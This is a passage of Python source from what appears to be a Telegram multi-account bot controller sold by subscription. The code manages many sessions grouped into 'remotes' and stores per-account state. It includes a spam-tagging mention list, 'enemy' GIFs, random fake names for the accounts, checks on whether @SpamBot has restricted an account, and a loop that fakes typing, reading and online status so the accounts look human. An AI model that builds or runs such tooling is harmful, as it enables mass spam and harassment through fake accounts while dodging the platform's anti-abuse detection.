              kwargs.pop("parse_mode", None)
      return args, kwargs

    async def _send_message_premium(self, *args, **kwargs):
      args, kwargs = _inject_emoji(args, kwargs)
      return await _orig_send_message(self, *args, **kwargs)

    async def _edit_message_premium(self, *args, **kwargs):
      args, kwargs = _inject_emoji(args, kwargs)
      return await _orig_edit_message(self, *args, **kwargs)

    TelegramClient.send_message = _send_message_premium
    TelegramClient.edit_message = _edit_message_premium
    TelegramClient._premium_emoji_patched = True

_patch_client_premium_emoji()

# default per-session state
DEFAULT_STATE = {
    "messages": [],                 # text ersali per-session (items can be str or dict for media)
    "locked_users": set(),          # mention list for spam tagging
    "locked_auto_reply": set(),     # legacy - kept for compat
    "enemy_gifs": [],               # legacy - kept for compat
    "self_reply_media": [],         # list of dicts {"path":..,"type":"photo"|"gif"|"video"|"sticker"}
    "self_reply_text": [],          # list of texts for self auto-reply
    "self_reply_filter": "all",     # filter mode: all/text/photo/gif/video/sticker
    "self_reply_interval": 30,      # seconds between replies to same sender (anti-flood)
    "send_interval": 10,
    "second_on_text": 2,
    "tag_owner": False,
    "auto_reply": False,
    "bot_active": True,
    "active_timer": None,
    "timer_task": None,
    "mutepv_enabled": False,
    "session_admins": set(),
    "name": None,
    "display_name": None,
    "autotyping": False,
    "autorecord": False,
}

# -------------------------
# helpers (persistence)
# -------------------------
def ensure_sessions_dir():
    try:
      if not os.path.isdir(SESSIONS_DIR):
          os.makedirs(SESSIONS_DIR, exist_ok=True)
    except Exception:
      pass

def per_session_state_path(session_name: str) -> str:
    ensure_sessions_dir()
    return os.path.join(SESSIONS_DIR, f"{session_name}_state.json")

def media_store_dir(session_name: str) -> str:
    ensure_sessions_dir()
    d = os.path.join(SESSIONS_DIR, f"{session_name}_media")
    os.makedirs(d, exist_ok=True)
    return d

def _atomic_write_json(path: str, data) -> None:
    """Write JSON atomically: write to temp file then rename to avoid corruption on crash."""
    import tempfile
    dir_ = os.path.dirname(os.path.abspath(path)) or "."
    try:
      fd, tmp = tempfile.mkstemp(dir=dir_, suffix=".tmp")
      try:
          with os.fdopen(fd, "w", encoding="utf-8") as f:
              json.dump(data, f, ensure_ascii=False, indent=2)
          os.replace(tmp, path)
      except Exception:
          try:
              os.unlink(tmp)
          except Exception:
              pass
          raise
    except Exception as e:
      # fallback: direct write
      try:
          with open(path, "w", encoding="utf-8") as f:
              json.dump(data, f, ensure_ascii=False, indent=2)
      except Exception as e2:
          log.warning(f"[atomic_write] {path}: {e2}")

def save_co_owners() -> None:
    try:
      _atomic_write_json(CO_OWNERS_DB, list(CO_OWNERS))
    except Exception as e:
      log.warning(f"save_co_owners error: {e}")

def load_db() -> None:
    global sessions_db, groups_db, bot_blacklist, manually_disabled, CO_OWNERS
    ensure_sessions_dir()
    if os.path.exists(SESSIONS_DB):
      try:
          with open(SESSIONS_DB, "r", encoding="utf-8") as f:
              sessions_db = json.load(f)
      except Exception as e:
          log.warning(f"[load_db] sessions.json corrupt/unreadable: {e} — starting empty")
          sessions_db = {}
    else:
      sessions_db = {}
    migrate_session_names()
    if os.path.exists(GROUPS_DB):
      try:
          with open(GROUPS_DB, "r", encoding="utf-8") as f:
              groups_db = json.load(f)
      except Exception as e:
          log.warning(f"[load_db] groups.json corrupt/unreadable: {e} — starting empty")
          groups_db = {}
    else:
      groups_db = {}
    _rebuild_sess_grp_index()   # build reverse index once at startup
    if os.path.exists(BLACKLIST_DB):
      try:
          with open(BLACKLIST_DB, "r", encoding="utf-8") as f:
              bot_blacklist = set(json.load(f))
      except Exception as e:
          log.warning(f"[load_db] blacklist.json corrupt/unreadable: {e} — starting empty")
          bot_blacklist = set()
    else:
      bot_blacklist = set()
    if os.path.exists(DISABLED_DB):
      try:
          with open(DISABLED_DB, "r", encoding="utf-8") as f:
              manually_disabled = set(json.load(f))
      except Exception as e:
          log.warning(f"[load_db] disabled_sessions.json corrupt/unreadable: {e} — starting empty")
          manually_disabled = set()
    else:
      manually_disabled = set()
    if os.path.exists(CO_OWNERS_DB):
      try:
          with open(CO_OWNERS_DB, "r", encoding="utf-8") as f:
              CO_OWNERS.update(json.load(f))
      except Exception as e:
          log.warning(f"[load_db] co_owners.json corrupt/unreadable: {e} — starting empty")
    global TRUSTED_GUARD_DEVICES
    if os.path.exists(TRUSTED_DEVICES_DB):
      try:
          with open(TRUSTED_DEVICES_DB, "r", encoding="utf-8") as f:
              TRUSTED_GUARD_DEVICES = json.load(f)
      except Exception as e:
          log.warning(f"[load_db] trusted_devices.json corrupt/unreadable: {e} — starting empty")
          TRUSTED_GUARD_DEVICES = []
    global GHOST_MODE
    if os.path.exists(GHOST_MODE_DB):
      try:
          with open(GHOST_MODE_DB, "r", encoding="utf-8") as f:
              GHOST_MODE = bool(json.load(f))
      except Exception:
          GHOST_MODE = False
    load_fingerprints()
    load_privacy_hardening_setting()

def save_db() -> None:
    try:
      ensure_sessions_dir()
      _atomic_write_json(SESSIONS_DB, sessions_db)
    except Exception as e:
      log.warning(f"save_db error: {e}")

def save_groups() -> None:
    try:
      _atomic_write_json(GROUPS_DB, groups_db)
    except Exception as e:
      log.warning(f"save_groups error: {e}")
    _rebuild_sess_grp_index()


def assign_session_to_group(sess: str, gname: str) -> Optional[str]:
    """Assign sess to gname with strict one-group-per-session isolation.
    Returns None on success, or a Persian error string on failure.
    Idempotent: returns None if the session is already in this group."""
    if sess in (MAIN_SESSION, "bot_session"):
        return "سشن سیستمیه"
    if sess not in sessions_db:
        return "اکانت در سیستم وجود ندارد"
    if gname not in groups_db:
        return f"ریموت '{gname}' وجود ندارد"
    # Already in this group — idempotent success
    if sess in groups_db[gname].get("sessions", []):
        return None
    # Enforce isolation: each session belongs to exactly one group
    existing = get_group_of_session(sess)
    if existing and existing != gname:
        return f"اکانت در ریموت «{existing}» ثبت شده است"
    # Check group capacity
    if is_group_full(gname):
        max_acc = groups_db[gname].get("max_accounts")
        return f"ریموت «{gname}» به سقف {max_acc} اکانت رسیده"
    groups_db[gname].setdefault("sessions", []).append(sess)
    save_groups()
    return None


def merge_imported_session_layout(
    imported_sessions: Dict[str, Any],
    imported_groups: Dict[str, Any],
    extracted_session_names: List[str],
) -> Dict[str, Any]:
    """Merge a backup's sessions/remotes without deleting unrelated local data.

    A full export contains both ``sessions.json`` and ``groups.json``.  The
    import path must apply them together; otherwise the session files return
    but their remote assignments do not.  Imported remote membership wins for
    the sessions present in the backup, while remotes not in the backup stay
    untouched.
    """
    imported_sessions = imported_sessions if isinstance(imported_sessions, dict) else {}
    imported_groups = imported_groups if isinstance(imported_groups, dict) else {}
    existing_session_names = set(sessions_db)
    existing_group_names = set(groups_db)
    imported_session_names = set()

    # Restore session metadata, but merge rather than replacing the whole
    # local database (older import behavior could remove unrelated sessions).
    for session_name, info in imported_sessions.items():
        if not isinstance(session_name, str) or not isinstance(info, dict):
            continue
        current = sessions_db.setdefault(session_name, {})
        current.update(info)
        imported_session_names.add(session_name)

    # A ZIP can contain session files without sessions.json.
    for session_name in extracted_session_names:
        if not isinstance(session_name, str) or not session_name:
            continue
        if session_name not in sessions_db:
            sessions_db[session_name] = {
                "phone": "",
                "created_at": datetime.utcnow().isoformat(),
                "admins": [],
            }
        imported_session_names.add(session_name)

    # Build the imported mapping first so a session is never left in two
    # remotes when a backup is restored over a different installation.
    imported_membership: Dict[str, str] = {}
    normalized_groups: Dict[str, Dict[str, Any]] = {}
    duplicate_memberships: List[str] = []
    for remote_name, raw_info in imported_groups.items():
        if not isinstance(remote_name, str) or not remote_name or not isinstance(raw_info, dict):
            continue
        info = dict(raw_info)
        raw_sessions = info.get("sessions", [])
        if not isinstance(raw_sessions, list):
            raw_sessions = []
        remote_sessions: List[str] = []
        for session_name in raw_sessions:
            if not isinstance(session_name, str) or not session_name:
                continue
            if session_name in imported_membership and imported_membership[session_name] != remote_name:
                duplicate_memberships.append(session_name)
                continue
            imported_membership[session_name] = remote_name
            remote_sessions.append(session_name)
            if session_name not in sessions_db:
                sessions_db[session_name] = {
                    "phone": "",
                    "created_at": datetime.utcnow().isoformat(),
                    "admins": [],
                }
            imported_session_names.add(session_name)
        info["sessions"] = remote_sessions
        try:
            info["owner"] = int(info.get("owner", OWNER_ID))
        except (TypeError, ValueError):
            info["owner"] = OWNER_ID
        normalized_groups[remote_name] = info

    # Remove imported sessions from any old remote before restoring their
    # backed-up assignment.  Other local sessions/remotes are preserved.
    for remote_name, remote_info in groups_db.items():
        if not isinstance(remote_info, dict):
            continue
        remote_info["sessions"] = [
            session_name
            for session_name in remote_info.get("sessions", [])
            if session_name not in imported_membership
        ]

    remotes_created = 0
    for remote_name, imported_info in normalized_groups.items():
        if remote_name not in groups_db:
            remotes_created += 1
            groups_db[remote_name] = imported_info
        else:
            # Restore all remote settings, including owner, while retaining
            # no stale membership from the previous installation.
            groups_db[remote_name].update(imported_info)
            groups_db[remote_name]["sessions"] = imported_info["sessions"]

    _rebuild_sess_grp_index()
    return {
        "new_sessions": sorted(
            session_name
            for session_name in extracted_session_names
            if session_name not in existing_session_names
        ),
        "imported_sessions": len(imported_session_names),
        "remotes_created": remotes_created,
        "remotes_restored": len(normalized_groups),
        "duplicate_memberships": duplicate_memberships,
        "had_session_data": bool(imported_sessions or extracted_session_names),
        "had_group_data": bool(normalized_groups),
        "had_new_group_names": set(normalized_groups) - existing_group_names,
    }


def save_trusted_devices() -> None:
    try:
      _atomic_write_json(TRUSTED_DEVICES_DB, TRUSTED_GUARD_DEVICES)
    except Exception as e:
      log.warning(f"save_trusted_devices error: {e}")

def save_ghost_mode() -> None:
    try:
      _atomic_write_json(GHOST_MODE_DB, GHOST_MODE)
    except Exception as e:
      log.warning(f"save_ghost_mode error: {e}")

def _gen_unique_random_names(n: int) -> list:
    """Generate n unique (first_name, last_name) English pairs with no similarity."""
    import random as _rnd
    _FIRST = [
      "Aaron","Adam","Alan","Albert","Alex","Andrew","Anthony","Arthur","Austin","Benjamin",
      "Blake","Brandon","Brian","Bruce","Bryan","Calvin","Carl","Charles","Christian","Christopher",
      "Connor","Craig","Curtis","Daniel","David","Dean","Dennis","Derek","Donald","Douglas",
      "Dylan","Edward","Elliot","Ethan","Eugene","Evan","Frank","Frederick","Gabriel","Gavin",
      "George","Gerald","Glen","Gordon","Grant","Gregory","Harold","Harrison","Henry","Howard",
      "Hunter","Ian","Jack","Jacob","James","Jason","Jeremy","Jesse","Joel","Jonathan",
      "Jordan","Joseph","Justin","Keith","Kenneth","Kevin","Kyle","Lance","Lawrence","Leonard",
      "Logan","Louis","Lucas","Luke","Marcus","Mark","Martin","Matthew","Michael","Miles",
      "Mitchell","Nathan","Neil","Nicholas","Noah","Norman","Oliver","Oscar","Patrick","Paul",
      "Peter","Philip","Raymond","Richard","Robert","Roger","Ronald","Russell","Ryan","Samuel",
      "Scott","Sean","Simon","Stephen","Steven","Thomas","Timothy","Todd","Travis","Trevor",
      "Tyler","Victor","Vincent","Walter","Warren","Wayne","Wesley","William","Zachary","Zane",
      "Amber","Ashley","Brittany","Caroline","Charlotte","Christine","Claire","Diana","Emily","Emma",
      "Grace","Hannah","Heather","Jessica","Julia","Karen","Katherine","Kelly","Laura","Lauren",
      "Leah","Linda","Lisa","Megan","Melissa","Michelle","Monica","Nancy","Nicole","Olivia",
      "Patricia","Rachel","Rebecca","Sarah","Stephanie","Susan","Taylor","Tiffany","Victoria","Zoe"
    ]
    _LAST = [
      "Adams","Allen","Anderson","Bailey","Baker","Barnes","Bell","Bennett","Brooks","Brown",
      "Butler","Campbell","Carter","Clark","Cole","Collins","Cook","Cooper","Cox","Cruz",
      "Davis","Diaz","Edwards","Evans","Fisher","Fleming","Flores","Foster","Fox","Freeman",
      "Garcia","Gibson","Gonzalez","Graham","Grant","Gray","Green","Griffin","Hall","Harris",
      "Hayes","Henderson","Hill","Howard","Hughes","Jackson","James","Jenkins","Johnson","Jones",
      "Jordan","Kelly","Kim","King","Lee","Lewis","Long","Lopez","Martin","Martinez",
      "Mason","Miller","Mitchell","Moore","Morgan","Morris","Murphy","Myers","Nelson","Nguyen",
      "Parker","Patterson","Patel","Perez","Perry","Peterson","Phillips","Powell","Price","Reed",
      "Richardson","Rivera","Roberts","Robinson","Rodriguez","Rogers","Ross","Russell","Sanders","Scott",
      "Shaw","Simmons","Smith","Stewart","Sullivan","Taylor","Thomas","Thompson","Torres","Turner",
      "Walker","Ward","Washington","Watson","White","Williams","Wilson","Wood","Wright","Young"
    ]
    used, result = set(), []
    attempts = 0
    while len(result) < n and attempts < n * 20:
      attempts += 1
      fn = _rnd.choice(_FIRST)
      ln = _rnd.choice(_LAST)
      key = (fn, ln)
      if key not in used:
          used.add(key)
          result.append(key)
    return result

def save_blacklist() -> None:
    try:
      with open(BLACKLIST_DB, "w", encoding="utf-8") as f:
          json.dump(list(bot_blacklist), f)
    except Exception as e:
      log.warning(f"save_blacklist error: {e}")


def _font(text: str) -> str:
    """تبدیل حروف و اعداد ASCII به Mathematical Sans-Serif Bold Italic Unicode برای دکمه‌ها.
    نمونه: Attacker → 𝘼𝙩𝙩𝙖𝙘𝙠𝙚𝙧  |  Session123 → 𝙎𝙚𝙨𝙨𝙞𝙤𝙣𝟭𝟮𝟯
    """
    result = []
    for ch in str(text):
      o = ord(ch)
      if 65 <= o <= 90:      # A-Z → Sans-Serif Bold Italic
          result.append(chr(0x1D63C + o - 65))
      elif 97 <= o <= 122:   # a-z → Sans-Serif Bold Italic
          result.append(chr(0x1D656 + o - 97))
      elif 48 <= o <= 57:    # 0-9 → Sans-Serif Bold
          result.append(chr(0x1D7EC + o - 48))
      else:
          result.append(ch)
    return ''.join(result)

def save_disabled() -> None:
    """ذخیره لیست سشن‌هایی که دستی خاموش شدن تا بعد از ری‌استارت هم روشن نشن."""
    try:
      with open(DISABLED_DB, "w", encoding="utf-8") as f:
          json.dump(list(manually_disabled), f)
    except Exception as e:
      log.warning(f"save_disabled error: {e}")

def is_owner_only_session(session_name: str) -> bool:
    """Returns True if this session is marked as the first/owner-only session in its group."""
    g = get_group_of_session(session_name)
    if not g:
      return False
    sessions_list = groups_db[g].get("sessions", [])
    return len(sessions_list) > 0 and sessions_list[0] == session_name and groups_db[g].get("owner_only_first", True)

def is_group_full(gname: str) -> bool:
    """Returns True if the group has reached its max_accounts limit."""
    info = groups_db.get(gname, {})
    max_acc = info.get("max_accounts")
    if max_acc is None:
      return False
    return len(info.get("sessions", [])) >= int(max_acc)

def _group_expiry_dt(gname: str) -> Optional[datetime]:
    """Returns the expiry datetime of a group's subscription, or None if unlimited."""
    exp = groups_db.get(gname, {}).get("expires_at")
    if not exp:
      return None
    try:
      return datetime.fromisoformat(exp)
    except Exception:
      return None

def is_group_expired(gname: str) -> bool:
    """Returns True if this group's subscription has an expiry date and it has passed."""
    dt = _group_expiry_dt(gname)
    if dt is None:
      return False
    return datetime.utcnow() > dt

def group_expiry_label(gname: str) -> str:
    """Human-readable (Persian) subscription status for a group."""
    dt = _group_expiry_dt(gname)
    if dt is None:
      return "بدون محدودیت زمانی"
    now = datetime.utcnow()
    if now > dt:
      return f"⚠️ منقضی شده ({dt.strftime('%Y-%m-%d')})"
    days_left = (dt - now).days
    return f"✅ فعال تا {dt.strftime('%Y-%m-%d')} ({days_left} روز باقی)"

def set_group_subscription_days(gname: str, days: int) -> None:
    """Sets (or clears, if days<=0) the subscription expiry for a group, counted from now."""
    if gname not in groups_db:
      return
    if days <= 0:
      groups_db[gname].pop("expires_at", None)
    else:
      groups_db[gname]["expires_at"] = (datetime.utcnow() + timedelta(days=days)).isoformat()
    save_groups()

def auto_add_to_owner_group(sess: str, adder_id: int) -> tuple:
    """Auto-add session to adder's group. If none exists, create 'group1'. Returns (group_name, error_or_None)."""
    # find existing group owned by adder
    for gname, info in groups_db.items():
      try:
          if int(info.get("owner", 0)) == adder_id:
              if sess not in info.get("sessions", []):
                    _err = assign_session_to_group(sess, gname)
                    if _err:
                        return gname, f" {_err}"
              return gname, None
      except Exception:
          continue
    # no group found — create default group1 (or group2, etc.)
    base = "group"
    idx = 1
    while f"{base}{idx}" in groups_db:
      idx += 1
    gname = f"{base}{idx}"
    groups_db[gname] = {"owner": adder_id, "sessions": [sess], "owner_only_first": True}
    save_groups()
    return gname, None

async def send_spoiler(client: TelegramClient, chat_id, text: str) -> None:
    """Send a spoiler/glass message."""
    try:
      await client.send_message(chat_id, f"<spoiler>{text}</spoiler>", parse_mode="html")
    except Exception:
      try:
          await client.send_message(chat_id, text)
      except Exception:
          pass

async def finish_group_assignment(client: TelegramClient, chat_id, sess: str, phone: str, sender: int) -> None:
    """After session is registered, either auto-assign to group or ask user to pick."""
    owner_groups = [g for g, info in groups_db.items() if int(info.get("owner", 0)) == sender]
    if len(owner_groups) == 0:
      # no groups → create group1 and auto-add
      gname, err = auto_add_to_owner_group(sess, sender)
      if err:
          await send_spoiler(client, chat_id, err)
          return
      sessions_in_group = groups_db.get(gname, {}).get("sessions", [])
      is_first = len(sessions_in_group) == 1
      role_label = "👑 اکانت اول (مخصوص owner)" if is_first else f"اکانت #{len(sessions_in_group)}"
      notif = f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}"
      await send_spoiler(client, chat_id, notif)
      try:
          await send_spoiler(main_client, OWNER_ID, notif)
      except Exception:
          pass
    elif len(owner_groups) == 1:
      # exactly one group → auto-add (check limit first)
      gname = owner_groups[0]
      _err = assign_session_to_group(sess, gname)
      if _err:
          await send_spoiler(client, chat_id, f" {_err}")
          return
      sessions_in_group = groups_db[gname].get("sessions", [])
      is_first = len(sessions_in_group) == 1
      role_label = "👑 اکانت اول (مخصوص owner)" if is_first else f"اکانت #{len(sessions_in_group)}"
      notif = f" اکانت جدید اضافه شد\nنام: {sess}\nریموت: {gname}\nنقش: {role_label}\nشماره: {phone}"
      await send_spoiler(client, chat_id, notif)
      try:
          await send_spoiler(main_client, OWNER_ID, notif)
      except Exception:
          pass
    else:
      # multiple groups → ask user to pick (filter out full groups)
      available_groups = [g for g in owner_groups if not is_group_full(g)]
      if not available_groups:
          await send_spoiler(client, chat_id, " همه ریموت‌های شما به سقف اکانت رسیده‌اند. ابتدا سقف یک ریموت را افزایش دهید.")
          return
      pending_group_selection[sender] = {"sess": sess, "phone": phone}
      group_list = "\n".join([
          f"• {g} ({len(groups_db[g].get('sessions', []))}/{groups_db[g].get('max_accounts','∞')} اکانت)"
          for g in available_groups
      ])
      msg = (
          f" چند ریموت دارید. اکانت {sess} رو کجا بذارم؟\n\n"
          f"{group_list}\n\n"
          f"بنویسید: pickgroup <نام_گروه>"
      )
      await send_spoiler(client, chat_id, msg)

def load_session_state(session_name: str) -> Dict[str, Any]:
    path = per_session_state_path(session_name)
    if os.path.exists(path):
      try:
          with open(path, "r", encoding="utf-8") as f:
              data = json.load(f)
              data.setdefault("messages", [])
              data["locked_users"] = set(data.get("locked_users", []))
              data["locked_auto_reply"] = set(data.get("locked_auto_reply", []))
              data["session_admins"] = set(data.get("session_admins", []))
              data.setdefault("send_interval", 10)
              data.setdefault("bot_active", True)
              data.setdefault("enemy_gifs", [])
              data.setdefault("autotyping", False)
              data.setdefault("autorecord", False)
              data["name"] = session_name
              return data
      except Exception as _e:
          log.warning(f"[load_session_state] {session_name} corrupt — using defaults: {_e}")
    s = dict(DEFAULT_STATE)
    s["messages"] = list(DEFAULT_STATE["messages"])
    s["locked_users"] = set(DEFAULT_STATE["locked_users"])
    s["locked_auto_reply"] = set(DEFAULT_STATE["locked_auto_reply"])
    s["session_admins"] = set(DEFAULT_STATE["session_admins"])
    s["enemy_gifs"] = list(DEFAULT_STATE.get("enemy_gifs", []))
    s["name"] = session_name
    return s

def save_session_state(session_name: str, state: Dict[str, Any]) -> None:
    path = per_session_state_path(session_name)
    try:
      copy = dict(state)
      copy["locked_users"] = list(state.get("locked_users", []))
      copy["locked_auto_reply"] = list(state.get("locked_auto_reply", []))
      copy["session_admins"] = list(state.get("session_admins", []))
      copy["enemy_gifs"] = list(state.get("enemy_gifs", []))
      _atomic_write_json(path, copy)
    except Exception as e:
      log.warning(f"save_session_state error for {session_name}: {e}")

# Session naming / migration
def is_sequential_session(name: str) -> bool:
    return bool(re.match(r'^session_\d+$', name))

def generate_next_session_name() -> str:
    nums = []
    for n in list(sessions_db.keys()):
      m = re.match(r'^session_(\d+)$', n)
      if m:
          nums.append(int(m.group(1)))
    nxt = 1
    if nums:
      nxt = max(nums) + 1
    while True:
      candidate = f"session_{nxt}"
      if candidate not in sessions_db:
          return candidate
      nxt += 1

def safe_rename_file(src: str, dst: str) -> None:
    try:
      if os.path.exists(src):
          os.rename(src, dst)
    except Exception:
      try:
          import shutil
          shutil.copy2(src, dst)
          os.remove(src)
      except Exception:
          pass

def migrate_session_names() -> None:
    global sessions_db
    changed = False
    new_db = {}
    used_numbers = set()
    for name, info in list(sessions_db.items()):
      if is_sequential_session(name):
          new_db[name] = info
          m = re.match(r'^session_(\d+)$', name)
          if m:
              used_numbers.add(int(m.group(1)))
    for name, info in list(sessions_db.items()):
      if is_sequential_session(name):
          continue
      new_name = generate_next_session_name()
      old_state = per_session_state_path(name)
      new_state = per_session_state_path(new_name)
      safe_rename_file(old_state, new_state)
      old_sess_file = os.path.join(SESSIONS_DIR, f"{name}.session")
      new_sess_file = os.path.join(SESSIONS_DIR, f"{new_name}.session")
      safe_rename_file(old_sess_file, new_sess_file)
      new_db[new_name] = info
      changed = True
    if changed:
      sessions_db = new_db
      save_db()

def get_session_index(session_name: str) -> int:
    m = re.match(r'^session_(\d+)$', session_name)
    if m:
      return int(m.group(1))
    keys = sorted(sessions_db.keys())
    if session_name in keys:
      return keys.index(session_name) + 1
    return 0

# -------------------------
# Group helpers
# -------------------------
def get_sessions_for_owner(owner_id: int) -> Set[str]:
    res = set()
    for gname, info in groups_db.items():
      try:
          if int(info.get("owner", 0)) == owner_id:
              for s in info.get("sessions", []):
                    res.add(s)
      except Exception:
          continue
    return res

def get_group_of_session(session_name: str) -> Optional[str]:
    for gname, info in groups_db.items():
      if session_name in info.get("sessions", []):
          return gname
    return None

def is_owner_of_session(user_id: int, session_name: str) -> bool:
    g = get_group_of_session(session_name)
    if not g:
      return False
    try:
      return int(groups_db[g].get("owner", 0)) == user_id
    except Exception:
      return False

def is_group_admin_of_session(user_id: int, session_name: str) -> bool:
    """Check if user_id is in og_admins of the group containing session_name."""
    g = get_group_of_session(session_name)
    if not g:
      return False
    try:
      return user_id in groups_db[g].get("og_admins", [])
    except Exception:
      return False

# -------------------------
# Utilities / access checks
# -------------------------
def is_owner(uid: int) -> bool:
    return uid == OWNER_ID or uid in CO_OWNERS

def is_admin(uid: int) -> bool:
    return uid in ADMINS

def is_global_admin(uid: int) -> bool:
    return uid in GLOBAL_ADMINS or uid == OWNER_ID

def is_session_admin(uid: int, session_name: str) -> bool:
    try:
      sdb = sessions_db.get(session_name, {})
      if sdb.get("admins"):
          return uid in set(sdb.get("admins", []))
      p = per_session_state_path(session_name)
      if os.path.exists(p):
          st = load_session_state(session_name)
          return uid in st.get("session_admins", set())
    except Exception:
      pass
    return False

def has_admin_access(uid: int, session_name: str = None, state: dict = None) -> bool:
    # if this is an owner-only (first) session, only OWNER_ID can control it
    if session_name and is_owner_only_session(session_name):
      return is_owner(uid)
    if is_owner(uid):
      return True
    if uid in ADMINS or is_global_admin(uid):
      return True
    if session_name and is_owner_of_session(uid, session_name):
      return True
    if session_name and is_group_admin_of_session(uid, session_name):
      return True
    if session_name and is_session_admin(uid, session_name):
      return True
    if state and isinstance(state, dict):
      try:
          if uid in state.get("session_admins", set()):
              return True
      except Exception:
          pass
    return False

# safe reply helper — always sends as spoiler/glass message
async def minimal_reply(client: TelegramClient, event, text: str) -> None:
    try:
      await client.send_message(event.chat_id, f"<spoiler>{text}</spoiler>", parse_mode="html")
    except Exception:
      try:
          await client.send_message(event.chat_id, text)
      except Exception:
          pass

# resolve sender id
async def resolve_sender_id_from_message(msg) -> Optional[int]:
    if getattr(msg, "sender_id", None):
      return msg.sender_id
    if getattr(msg, "from_id", None):
      fid = msg.from_id
      if hasattr(fid, "user_id"):
          return fid.user_id
      if isinstance(fid, int):
          return fid
    if getattr(msg, "forward", None):
      fwd = msg.forward
      if getattr(fwd, "sender_id", None):
          return fwd.sender_id
    return None

# -------------------------
# Auto-send loop generator
# -------------------------
def get_owner_id_for_session(session_name: str) -> Optional[int]:
    for gname, info in groups_db.items():
      if session_name in info.get("sessions", []):
          return int(info.get("owner", 0)) or None
    return None

# -------------------------
# Report / restriction status check
# -------------------------
async def _check_report_status(client: "TelegramClient") -> str:
    """Check if this Telegram account is spam-restricted by messaging @SpamBot.
    Returns the full response text from SpamBot in Persian-friendly format."""
    try:
      async with client.conversation("@SpamBot", timeout=20, exclusive=False) as conv:
          await conv.send_message("/start")
          resp = await conv.get_response()
          text = (resp.text or "").strip()
          if not text:
              return " پاسخی از SpamBot نگرفتیم"
          return text
    except asyncio.TimeoutError:
      return " SpamBot جواب نداد (timeout)"
    except Exception as _e:
      err = str(_e).lower()
      if "auth" in err or "unauthorized" in err:
          return " اکانت آفلاین"
      # fallback: try basic me.restricted check
      try:
          me = await client.get_me()
          if not me:
              return " نامشخص"
          if not getattr(me, "restricted", False):
              return " ریپورت نیست (SpamBot در دسترس نبود)"
          return " محدودیت دارد (SpamBot در دسترس نبود)"
      except Exception:
          return f" خطا: {_e}"

# -------------------------
# Worker lifecycle: start/stop
# -------------------------
def _apply_sqlite_wal_to_file(session_path: str) -> None:
    """Enable WAL mode on a session file BEFORE Telethon opens it."""
    import sqlite3 as _sqlite3
    db_file = session_path if session_path.endswith(".session") else session_path + ".session"
    if not os.path.exists(db_file):
      return
    try:
      _c = _sqlite3.connect(db_file, timeout=10)
      _c.execute("PRAGMA journal_mode=WAL")
      _c.execute("PRAGMA busy_timeout=10000")
      _c.commit()
      _c.close()
    except Exception as _e:
      log.warning(f"[WAL] {db_file}: {_e}")

_startup_lock: Optional[asyncio.Lock] = None

def _get_startup_lock() -> asyncio.Lock:
    global _startup_lock
    if _startup_lock is None:
      _startup_lock = asyncio.Lock()
    return _startup_lock



async def _human_sim_loop(client: TelegramClient, session_name: str, state: dict) -> None:
    """شبیه‌ساز رفتار انسانی — تایپ، خوندن پیام، و آنلاین شدن در ساعت‌های تصادفی."""
    await asyncio.sleep(random.uniform(30, 90))   # صبر اولیه
    while True:
      try:
          if not state.get("human_sim", False):
              break
          if not client.is_connected():
              await asyncio.sleep(30)
              continue

          # آنلاین نگه داشتن — فقط اگه Ghost Mode خاموشه
          if not GHOST_MODE:
              try:
                    from telethon.tl.functions.account import UpdateStatusRequest as _USR_HS
                    await client(_USR_HS(offline=False))
              except Exception:
                    pass

          # گرفتن چند دیالوگ اخیر و یکی رو رندوم انتخاب کن
          try:
              dialogs = await client.get_dialogs(limit=20)
              if dialogs:
                    # فقط گروه‌ها و کانال‌هایی که اخیراً پیام داشتن
                    candidates = [d for d in dialogs if d.is_group or d.is_channel or d.is_user]
                    if candidates:
                        picked = random.choice(candidates[:10])
                        try:
                            # typing action — بدون ارسال پیام
                            from telethon.tl.functions.messages import SetTypingRequest as _STR_HS
                            action_cls = random.choice([
                                SendMessageTypingAction,
                                SendMessageChooseStickerAction,
                            ])
                            peer = picked.entity or picked.id
                            await client(_STR_HS(peer=peer, action=action_cls()))
                            # یه مدت تایپ کن
                            await asyncio.sleep(random.uniform(2, 8))
                            # کنسل تایپ
                            from telethon.tl.types import SendMessageCancelAction as _SCA
                            await client(_STR_HS(peer=peer, action=_SCA()))
                        except Exception:
                            pass
                        # مارک رید
                        try:
                            peer = picked.entity or picked.id
                            await client.send_read_acknowledge(peer)
                        except Exception:
                            pass
          except Exception:
              pass

          # آفلاین کوتاه قبل از خواب
          if not GHOST_MODE:
              try:
                    from telethon.tl.functions.account import UpdateStatusRequest as _USR_HS2
                    await client(_USR_HS2(offline=True))
              except Exception:
                    pass

          # خواب بین ۱۵ تا ۷۵ دقیقه
          await asyncio.sleep(random.uniform(900, 4500))

      except asyncio.CancelledError:
          break
      except Exception as e:
          log.warning(f"[human-sim] error in {session_name}: {e}")
          await asyncio.sleep(60)

    log.warning(f"[human-sim] stopped for {session_name}")


    # auto_scan_trusted_devices حذف شد — دستگاه‌ها باید دستی از پنل ریموت اعتمادسازی بشن

async def start_worker(session_name: str, phone: Optional[str] = None) -> None:
    if PAUSED_BOTS:
      pass
    if session_name in managed:
      return
    _sess_path = sess_path(session_name)
    _apply_sqlite_wal_to_file(_sess_path)   # set WAL before Telethon locks the file
    client = _make_client(
      _sess_path, session_name=session_name,
      connection_retries=5, retry_delay=2,
    )
    try:
      async with _get_startup_lock():
          await client.connect()
          await asyncio.sleep(0.5)
      if not await client.is_user_authorized():
          await client.disconnect()
          return
      state = load_session_state(session_name)
      state.setdefault("messages", [])
      state.setdefault("locked_users", set())
      state.setdefault("locked_auto_reply", set())
      state.setdefault("session_admins", set())
      state.setdefault("send_interval", 10)
      state.setdefault("second_on_text", 2)
      state.setdefault("tag_owner", False)
      state.setdefault("bot_active", True)
      state.setdefault("enemy_gifs", [])
      state.setdefault("self_reply_media", [])
      state.setdefault("self_reply_text", [])
      state.setdefault("self_reply_filter", "all")
      state.setdefault("self_reply_interval", 30)
      state.setdefault("autotyping", False)
      state.setdefault("autorecord", False)
      state.setdefault("human_sim", False)
      state["name"] = session_name

      try:
          _me = await client.get_me()
          _my_uid = _me.id if _me else None
      except Exception:
          _my_uid = None
      meta = {"client": client, "state": state, "task": None, "uid": _my_uid}
      managed[session_name] = meta
      attach_handlers(client, session_name, state, is_main=(session_name == MAIN_SESSION))

      # Privacy Auto-Hardening: تنظیمات حریم خصوصی رو خودکار سخت می‌کنه
      if PRIVACY_HARDENING_ENABLED:
